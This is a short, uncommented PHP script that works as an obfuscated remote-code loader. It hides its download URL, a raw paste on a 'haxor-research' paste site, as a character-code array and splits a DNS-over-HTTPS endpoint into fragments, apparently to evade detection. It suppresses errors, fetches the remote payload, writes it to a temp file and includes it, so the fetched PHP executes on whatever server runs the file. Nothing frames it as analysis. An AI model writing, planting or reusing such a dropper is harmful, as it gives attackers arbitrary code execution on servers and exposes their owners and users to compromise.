<?php 
error_reporting(0);
set_time_limit(0);
$u = [104,116,116,112,115,58,47,47,112,97,115,116,101,46,104,97,120,111,114,45,114,101,115,101,97,114,99,104,46,99,111,109,47,114,97,119,47,54,51,48,52,52,54,55,56];
$url = implode('', array_map('chr', $u));
$dns = 'ht';
$dns .= 'tps:/';
$dns .= '/cloud';
$dns .= 'flare-';
$dns .= 'dns.c';
$dns .= 'om/dns';
$dns .= '-query';

$ch = curl_init($url);
if (defined('CURLOPT_DOH_URL')) {
    curl_setopt($ch, CURLOPT_DOH_URL, $dns);
}
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
$res = curl_exec($ch);
curl_close($ch);

$tmp = tmpfile();
$path = stream_get_meta_data($tmp)['uri'];
fprintf($tmp, '%s', $res);
include($path);
?>